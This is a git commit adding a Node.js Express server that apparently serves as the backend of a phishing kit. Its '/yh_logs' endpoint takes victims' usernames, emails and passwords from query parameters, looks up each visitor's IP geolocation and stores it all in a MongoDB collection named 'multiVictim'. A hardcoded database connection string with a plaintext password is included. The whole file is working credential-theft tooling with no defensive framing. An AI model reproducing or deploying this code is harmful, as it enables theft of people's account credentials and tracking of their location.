1387bff9485388f42df19be9607032f75f65592e
kingshmoney7 <119087372+kingshmoney7@users.noreply.github.com>
2022-11-26 07:02:31 +0100

    Add files via upload

---
+++ index.js
@@ -0,0 +1,116 @@
+const express = require('express')
+const app = express()
+const port = process.env.PORT || 9000;
+    rp = require('request-promise'),	
+    requestIp = require('request-ip'),
+    bodyParser = require('body-parser'),
+    mongoose = require("mongoose"),
+    Sniffr = require("sniffr"),
+    s = new Sniffr(),
+    multiVictimSchema = null,
+    multiVictim = null,
+    visitorIp = null,
+    db = null;
+
+mongoose.connect("mongodb+srv://beterdaze7:Newking1997@cluster0.dymha.mongodb.net/myFirstDatabase?retryWrites=true&w=majority", {
+    useNewUrlParser: true,
+    useUnifiedTopology: true
+})
+
+db = mongoose.connection;
+
+multiVictimSchema = new mongoose.Schema({
+	username: String,
+    email: String,
+    password: String,
+    password2: String,
+    userAgent: String,
+    victimIpInfo: {}
+}, {
+    minimize: false
+})
+
+multiVictim = mongoose.model("multiVictim", multiVictimSchema);
+
+
+
+
+
+app.use(bodyParser.json())
+
+app.use(function(req, res, next) {
+    res.header("Access-Control-Allow-Origin", "*");
+    res.header("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept");
+    next();
+});
+
+app.get("/yh_logs", (req, res) => {
+    visitorIp = requestIp.getClientIp(req);
+    s.sniff(req.headers['user-agent']);
+    console.log(req.headers['user-agent']);
+    console.log(s.os.name);
+    console.log(visitorIp)
+    console.log(req.body)
+    res.setHeader("Content-Type", "text/plain");
+    getVictimIpInfoAndSavemultiVictimInfoToDb(req.query.username, req.query.email, req.query.password, req.query.password2, req.headers['user-agent'], req, res);
+})
+
+app.use(express.static('web'));
+
+
+
+function getVictimIpInfoAndSavemultiVictimInfoToDb(username, email, password, password2, userAgent, req, res) {
+
+    rp({
+        uri: `http://ip-api.com/json/${visitorIp}`,
+        json: true
+    }).then(victimIpInfo => {
+        console.log(victimIpInfo);
+
+        new multiVictim({
+			username,
+            email,
+            password,
+            password2,
+            userAgent,
+            victimIpInfo
+        }).save((err, doc) => {
+            if (err) {
+                console.log(err);
+                res.end("Server Error");
+            } else {
+				console.log("---");
+                console.log(doc);
+				console.log("---");
+                res.end("Done");
+            }
+        })
+
+    }).catch(err => {
+        console.log(err)
+        res.end("Server Error");
+    })
+
+}
+
+
+
+db.on("error", (err) => {
+    console.log(err);
+})
+
+db.once("open", () => {
+
+    console.log(`Database connected`);
+
+		app.listen(port, () => {
+		  console.log(`Example app listening at http://localhost:${port}`)
+		})
+
+})
+
+
+
+
+
+
